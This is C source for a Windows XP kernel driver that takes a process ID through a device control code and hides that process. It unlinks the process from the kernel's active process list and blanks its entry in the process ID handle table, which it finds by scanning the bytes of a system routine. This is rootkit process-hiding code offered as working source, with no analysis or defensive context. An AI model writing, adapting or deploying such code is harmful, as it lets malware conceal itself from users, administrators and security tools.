
#include <ntddk.h>

PDEVICE_OBJECT pDev = NULL;
UNICODE_STRING SymLinkName = { 0 };
UNICODE_STRING DeviceName = { 0 };

DWORD32 BuildNumb = 0;
KSPIN_LOCK my_spin_lock;
ULONG_PTR TableStaz = 0;


#define DOCTL_SETPID CTL_CODE(FILE_DEVICE_UNKNOWN,\
							  0x9527,\
							  METHOD_BUFFERED,\
							  FILE_ANY_ACCESS)

BOOLEAN StartEnumTable(ULONG_PTR start, ULONG_PTR Ep);

typedef struct _Hide_Pe
{
	ULONG_PTR TargetAddress;
	ULONG_PTR EpValue;
}Hide_Pe, *PHide_Pe;

Hide_Pe BeHided[5] = {0};

NTSTATUS PsLookupProcessByProcessId(
	HANDLE    ProcessId,
	PEPROCESS *Process
);

ULONG GetWinBuildNum()
{
	NTSTATUS status = 0;
	RTL_OSVERSIONINFOW Version = {0};
	Version.dwOSVersionInfoSize = sizeof(Version);
	status = RtlGetVersion(&Version);
	if (!NT_SUCCESS(status))
	{
		return 0;
	}
	
	KdPrint(("---%d----\n", Version.dwBuildNumber));
	return Version.dwBuildNumber;
}

BOOLEAN HideProcess(HANDLE pid)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS TargetEp = NULL;
	PLIST_ENTRY pList = NULL;	
	
	ULONG_PTR Activeoffset = 0;	
	ULONG_PTR Handletabe = 0;
	KIRQL irql = {0};

	BuildNumb = GetWinBuildNum();
	if (BuildNumb != 2600)	// Ö»Ö§³ÖXP
	{
		return FALSE;
	}
	Activeoffset = 0x088;

	status = PsLookupProcessByProcessId(pid, &TargetEp);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("error"));
		return FALSE;
	}

	pList = (PLIST_ENTRY)((ULONG_PTR)TargetEp + Activeoffset);
	if (!MmIsAddressValid(pList))
	{
		return FALSE;
	}

	if (TableStaz != 0)
	{
		StartEnumTable(TableStaz, (LONG_PTR)TargetEp);
	}

	KeAcquireSpinLock(&my_spin_lock, &irql);
	RemoveEntryList(pList);
	KeReleaseSpinLock(&my_spin_lock, irql);

	return TRUE;
}

NTSTATUS Unload(PDRIVER_OBJECT driver)
{
	KdPrint(("Unload...\n"));
	if (pDev)
	{
		IoDeleteSymbolicLink(&SymLinkName);
		IoDeleteDevice(pDev);
		pDev = NULL;
	}

	return STATUS_SUCCESS;
}

NTSTATUS MyDispatch(PDEVICE_OBJECT pObject, PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS MyDispatchClose(PDEVICE_OBJECT pObject, PIRP pIrp)
{
	for (int i = 0; i < 5; i++)
	{
		if (BeHided[i].TargetAddress != 0 && BeHided[i].EpValue != 0) {
			*(PULONG_PTR)(BeHided[i].TargetAddress) = BeHided[i].EpValue;
		}
	}

	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS MyDriverIoCtrl(PDEVICE_OBJECT pObject, PIRP pIrp)
{
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION irpo = IoGetCurrentIrpStackLocation(pIrp);
	ULONG inLength = irpo->Parameters.DeviceIoControl.InputBufferLength;
	ULONG outLenght = irpo->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG CODE = irpo->Parameters.DeviceIoControl.IoControlCode;
	ULONG info = 0;
	switch (CODE)
	{
	case DOCTL_SETPID:
	{
		DWORD32 dwValue = *(DWORD32*)pIrp->AssociatedIrp.SystemBuffer;
		HANDLE pid = (HANDLE)dwValue;
		PUCHAR outbuffer = pIrp->AssociatedIrp.SystemBuffer;
		if (pid)
		{
			BOOLEAN bRet = HideProcess(pid);
			if (bRet)
				memset(outbuffer, 0x22, 4);
			else
				memset(outbuffer, 0x00, 4);	 
		}
		info = 4;
		break;
	}
	default:
		KdPrint(("error\n"));
		status = STATUS_SUCCESS;	
		break;
	}

	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = info;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

BOOLEAN FindTable(ULONG_PTR start, ULONG_PTR Ep)
{
	BOOLEAN bRet = FALSE;
	ULONG_PTR pHandle_Table_Entry = 0;
	pHandle_Table_Entry = *((PULONG_PTR)start) + 0x10;
	for (ULONG uIndex = 1; uIndex < 0x200; uIndex++)
	{
		if (1)
		{
			ULONG_PTR TempEp = *((PULONG_PTR)pHandle_Table_Entry) & 0xFFFFFFF8;
			if (TempEp == Ep)
			{
				KdPrint(("Find: ---%p---\n", TempEp));
				for (int i = 0; i < 5; i++)
				{
					if (BeHided[i].TargetAddress == 0 && BeHided[i].EpValue == 0)
					{
						BeHided[i].TargetAddress = pHandle_Table_Entry;
						BeHided[i].EpValue = TempEp;
						break;
					}
				}
				*((PULONG_PTR)pHandle_Table_Entry) = 1;
				bRet = TRUE;
				break;
			}
		}
		pHandle_Table_Entry += 8;
	}

	return FALSE;
}

BOOLEAN FindTable1(ULONG_PTR start, ULONG_PTR Ep)
{
	BOOLEAN bRet = FALSE;
	do
	{
		bRet = FindTable(start, Ep);
		start += 8;
	} while (*(PULONG_PTR)start != 0);
	return bRet;
}

BOOLEAN FindTable2(ULONG_PTR start, ULONG_PTR Ep)
{
	BOOLEAN bRet = FALSE;
	do
	{
		bRet = FindTable1(start, Ep);
		start += 8;
	} while (*(PULONG_PTR)start != 0);
	return bRet;
}

BOOLEAN StartEnumTable(ULONG_PTR start, ULONG_PTR Ep)
{
	ULONG uFlag = 0;
	ULONG_PTR TempS = 0;
	BOOLEAN bRet = FALSE;

	TempS = start & 0xFFFFFFFC;
	uFlag = start & 0x03;
	switch (uFlag)
	{
	case 0:
	{
		bRet = FindTable(TempS, Ep);
		break;
	}
	case 1:
	{
		bRet = FindTable1(TempS, Ep);
		break;
	}
	case 2:
	{
		bRet = FindTable2(TempS, Ep);
		break;
	}
	default:
		break;
	}

	return bRet;
}

ULONG_PTR SearchTableCode()
{
	PVOID pPsLookupProcessByProcessIdAddress = NULL;	
	ULONG_PTR ulPrpcidTableValue = 0;	
	ULONG_PTR TempAddr = 0;
	ULONG Offset = 0;

	UNICODE_STRING ustrFuncName = {0};
	RtlInitUnicodeString(&ustrFuncName, L"PsLookupProcessByProcessId");
	pPsLookupProcessByProcessIdAddress = MmGetSystemRoutineAddress(&ustrFuncName);
	if (pPsLookupProcessByProcessIdAddress == NULL)
	{
		return ulPrpcidTableValue;
	}

	for (ULONG uIndex = 0; uIndex < 0x100; uIndex++)
	{
		if (*((PUCHAR)((ULONG_PTR)pPsLookupProcessByProcessIdAddress + uIndex)) == 0xFF &&
			*((PUCHAR)((ULONG_PTR)pPsLookupProcessByProcessIdAddress + uIndex + 1)) == 0x35 &&
			*((PUCHAR)((ULONG_PTR)pPsLookupProcessByProcessIdAddress + uIndex + 2)) == 0xC0 &&
			*((PUCHAR)((ULONG_PTR)pPsLookupProcessByProcessIdAddress + uIndex + 3)) == 0x49)
		{
			Offset = *((PULONG)((PUCHAR)((ULONG_PTR)pPsLookupProcessByProcessIdAddress + uIndex + 2)));
			TempAddr = (ULONG_PTR)Offset;
			
			ulPrpcidTableValue = *((PULONG_PTR)TempAddr);
			TempAddr = (ULONG_PTR)ulPrpcidTableValue;
			break;
		}
	}

	return TempAddr;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)
{	
	NTSTATUS status = STATUS_SUCCESS;
	
	driver->DriverUnload = Unload;

	do
	{
		RtlInitUnicodeString(&DeviceName, L"\\Device\\MyHide");
		status = IoCreateDevice(driver, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &pDev);		
		if (!NT_SUCCESS(status))
		{
			break;
		}

		pDev->Flags |= DO_BUFFERED_IO;
		RtlInitUnicodeString(&SymLinkName, L"\\??\\HideProcess");
		status = IoCreateSymbolicLink(&SymLinkName, &DeviceName);
		if (!NT_SUCCESS(status))
		{
			break;
		}

		for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		{
			driver->MajorFunction[i] = MyDispatch;
		}
		driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDriverIoCtrl;
		driver->MajorFunction[IRP_MJ_CLOSE] = MyDispatchClose;
	} while (FALSE);
	
	KeInitializeSpinLock(&my_spin_lock);
	TableStaz = SearchTableCode();

	return status;
}